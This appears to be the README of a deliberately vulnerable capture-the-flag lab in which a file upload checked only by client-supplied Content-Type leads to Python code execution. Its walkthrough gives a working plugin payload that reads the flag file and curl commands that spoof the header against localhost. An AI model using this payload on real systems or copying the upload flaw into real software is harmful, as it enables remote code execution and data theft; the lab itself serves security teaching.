# Upload RCE

Unrestricted file upload leading to code execution: the only validation is a
client-supplied Content-Type header, and uploads are imported as Python
plugins.

## Vulnerability description

Report studio lets users upload "plugins" and preview their output. The
upload handler checks one thing:

```python
if not f.content_type.startswith("image/"):
    reject
```

That header comes from the client, so it says whatever the uploader wants.
The file is stored by name in a plugins directory, and the preview endpoint
loads it with `importlib` and calls its `render()` function. Uploading a
`.py` file while claiming `Content-Type: image/png` is enough to run code as
the web process. Validating real content, enforcing an extension allowlist,
and never executing uploads would each close this.

## Vulnerable configuration

The flag is mounted at `/flag/flag.txt` and the Flask process can read it, so
a plugin whose `render()` returns the file contents wins.

## Running the lab

```bash
docker compose up
```

The app listens on http://localhost:8080.

## Exploitation walkthrough

Upload a real `.py` file with a browser and watch it bounce off the
Content-Type check. Then repeat the upload with curl, setting the header
yourself:

```python
import os
def render():
    return os.popen("cat /flag/flag.txt").read()
```

```
curl -F "file=@plugin.py;type=image/png" http://localhost:8080/upload
curl http://localhost:8080/preview?name=plugin.py
```

The preview renders the flag. `solutions/upload-rce/solve.py` in a checkout
of this repo automates both requests.

## References

- OWASP: unrestricted file upload
- PortSwigger Web Security Academy: file upload vulnerabilities
